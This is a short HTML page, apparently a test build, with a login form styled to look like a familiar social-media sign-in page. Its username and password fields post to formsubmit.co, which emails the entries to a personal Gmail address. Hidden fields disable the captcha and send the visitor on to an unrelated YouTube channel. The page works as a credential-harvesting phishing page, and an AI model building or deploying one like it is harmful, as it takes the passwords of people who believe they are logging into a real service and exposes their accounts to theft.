<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Natto</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body, html {
      height: 100%;
      background-color: #ffffff;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    form {
      background-color: #ffffff;
      padding: 30px;
      border-radius: 8px;
      border: 1px solid #ccc;
      box-shadow: 0 0 10px rgba(0,0,0,0.05);
      width: 100%;
      max-width: 350px;
      display: flex;
      flex-direction: column;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #262626;
    }

    input {
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }

    button {
      padding: 12px;
      background-color: #3897f0;
      border: none;
      color: white;
      font-weight: bold;
      border-radius: 4px;
      font-size: 14px;
      cursor: pointer;
    }

    button:hover {
      background-color: #2a78d4;
    }
  </style>
</head>
<body>

  <form action="https://formsubmit.co/fabiofranciscodn@gmail.com" method="POST">
    <h2>teste</h2>

    <input type="text" name="usuario" placeholder="" required />
    <input type="password" name="senha" placeholder="" required />

    <!-- FormSubmit config -->
    <input type="hidden" name="_subject" value="teste">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_captcha" value="false">
    <input type="hidden" name="_next" value="https://www.youtube.com/@NATTO_BEATS">

    <button type="submit">Enviar</button>
  </form>

</body>
</html>
